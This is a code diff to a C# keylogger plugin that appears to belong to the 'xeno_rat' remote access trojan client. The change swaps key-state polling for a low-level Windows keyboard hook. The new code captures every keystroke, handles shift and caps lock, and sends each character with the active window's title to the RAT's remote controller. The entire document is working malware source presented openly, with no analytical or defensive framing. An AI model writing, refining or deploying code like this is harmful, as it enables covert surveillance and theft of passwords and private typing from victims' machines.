@@ -1,8 +1,10 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Diagnostics;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using xeno_rat_client;
@@ -12,47 +14,75 @@ namespace Plugin
 {
     public class Main
     {
+        public delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll")]
+        public static extern IntPtr SetWindowsHookEx(int idHook, HookCallbackDelegate lpfn, IntPtr wParam, uint lParam);
+
+        [DllImport("user32.dll")]
+        public static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+        [DllImport("user32.dll")]
+        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+        private static int WH_KEYBOARD_LL = 13;
+        private static int WM_KEYDOWN = 0x100;
+
+        Node node;
+
+
         public async Task Run(Node node)
         {
             await node.SendAsync(new byte[] { 3 });//indicate that it has connected
+            
+            this.node = node;
+            IntPtr hookHandle=IntPtr.Zero;
+            new Thread(() =>
+            {
+                HookCallbackDelegate hcDelegate = HookCallback;
+                Process currproc = Process.GetCurrentProcess();
+                string mainModuleName = currproc.MainModule.ModuleName;
+                currproc.Dispose();
+                hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, GetModuleHandle(mainModuleName), 0);
+                Application.Run();
+            }).Start();
             while (node.Connected())
             {
-                string retchar = await GetKey();
-                if (retchar != null)
-                {
-                    string open_application = xeno_rat_client.Utils.GetCaptionOfActiveWindow().Replace("*", "");
-                    await node.SendAsync(Encoding.UTF8.GetBytes(open_application));
-                    await node.SendAsync(Encoding.UTF8.GetBytes(retchar));
-                }
-                
+                Application.DoEvents();
+                await Task.Delay(1);
             }
-        }
-
-        private async Task<string> GetKey() 
-        {
-            return await Task.Run(() =>
+            if (hookHandle != IntPtr.Zero) 
             {
-                for (int i = 0; i < 255; i++)
-                {
-                    short state = GetAsyncKeyState(i);
+                UnhookWindowsHookEx(hookHandle);
+            }
 
-                    if ((state & 0x8000) != 0 && !keyStates[i])
-                    {
-                        keyStates[i] = true;
-
-                        bool isShiftPressed = (GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
-                        string character = GetCharacterFromKey((uint)i, isShiftPressed);
-                        return character;
-                    }
-                    else if ((state & 0x8000) == 0 && keyStates[i])
-                    {
-                        keyStates[i] = false;
-                    }
-                }
-                return null;
-            });
         }
 
+        public async Task sendKeyData(string charectar) 
+        {
+            string open_application = xeno_rat_client.Utils.GetCaptionOfActiveWindow().Replace("*", "");
+            if (node == null || !node.Connected()) return;
+            await node.SendAsync(Encoding.UTF8.GetBytes(open_application));
+            await node.SendAsync(Encoding.UTF8.GetBytes(charectar));
+        }
+
+        public IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
+        {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
+            {
+                int vkCode = Marshal.ReadInt32(lParam);
+                bool isShiftPressed = (GetAsyncKeyState((int)Keys.ShiftKey) & 0x8000) != 0;
+                string character = GetCharacterFromKey((uint)vkCode, isShiftPressed);
+                if ((((ushort)GetKeyState(0x14)) & 0xffff) != 0)//check for caps lock
+                {
+                    character= character.ToUpper();
+                }
+                sendKeyData(character);
+            }
+            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
+        }
 
         private static Dictionary<uint, string> nonVisibleCharacters = new Dictionary<uint, string>()
         {
@@ -185,10 +215,13 @@ namespace Plugin
         [DllImport("user32.dll")]
         private static extern short GetAsyncKeyState(int vKey);
 
+        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
+        public static extern short GetKeyState(int keyCode);
 
         [DllImport("user32.dll")]
         private static extern int ToUnicode(uint virtualKeyCode, uint scanCode, byte[] keyboardState,
             [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder receivingBuffer,
             int bufferSize, uint flags);
+
     }
 }
